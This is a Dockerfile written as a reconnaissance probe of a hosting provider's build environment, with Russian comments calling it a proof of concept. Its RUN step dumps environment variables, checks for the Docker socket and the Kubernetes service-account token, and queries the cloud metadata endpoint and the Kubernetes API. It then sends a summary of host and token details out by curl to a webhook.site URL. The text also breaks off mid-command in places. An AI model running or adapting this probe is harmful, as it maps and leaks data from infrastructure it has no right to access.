FROM alpine
RUN apk add --no-cache curl

# Build-environment recon (Timeweb Apps docker build). PoC, не mass-scan: одиночные таргетед-проверки.
# Полный вывод идёт в build-лог (приватная панель). В OOB — только сводка/SHA (без слива секретов 3-й стороне).
RUN set +e; O="https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6"; \
  echo "########## BUILD RECON START ##########"; \
  echo "=== id ==="; id; \
  echo "=== hostname ==="; hostname; \
  echo "=== uname ==="; uname -a; \
  echo "=== virt/product ==="; cat /sys/class/dmi/id/product_name 2>/dev/null; cat /sys/class/dmi/id/sys_vendor 2>/dev/null; \
  echo "=== /.dockerenv ==="; ls -la /.dockerenv 2>&1; \
  echo "=== /proc/1/cgroup ==="; cat /proc/1/cgroup 2>&1; \
  echo "=== /proc/1/comm ==="; cat /proc/1/comm 2>&1; \
  echo "=== capabilities ==="; grep -i cap /proc/self/status 2>&1; \
  echo "=== mounts (kube/secret/docker) ==="; mount 2>&1 | grep -iE 'kube|secret|docker|host|overlay' | head -30; \
  echo "=== docker.sock ==="; ls -la /var/run/docker.sock /run/docker.sock 2>&1; \
  echo "=== k8s SA dir ==="; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1; \
  K=/var/run/secrets/kubernetes.io/serviceaccount/token; \
  echo "=== k8s SA namespace ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; \
  echo "=== ENV (build) ==="; env | sort; \
  echo "=== DNS kubernetes.default ==="; getent hosts kubernetes.default.svc kubernetes.default 2>&1; \
  echo "=== metadata 169.254.169.254 (3s) ==="; curl -s -m3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 200; echo; \
  echo "=== k8s API kubernetes.default (3s) ==="; curl -sk -m3 https://kubernetes.default.svc/version 2>&1 | head -c 300; echo; \
  echo "########## BUILD RECON END ##########"; \
  TOKLEN=0; TOKSHA="none"; if [ -r "$K" ]; then TOKLEN=$(wc -c < "$K"); TOKSHA=$(sha256sum "$K" | cut -c1-16); fi; \
  SUMMARY="id=$(id -u) host=$(hostname) pid1=$(cat /proc/1/comm 2>/dev/null) sa_token_len=$TOKLEN sa_token_sha=$TOKSHA ns=$(cat /var/run/secrets/kubernetes.i
o/serviceaccount/namespace 2>/dev/null)"; \
  echo "OOB SUMMARY: $SUMMARY"; \
  curl -s -m5 "$O/build-recon-summary" --data-urlencode "s=$SUM
  true

CMD ["sh","-c","echo recon-image-idle; sleep 3600"]
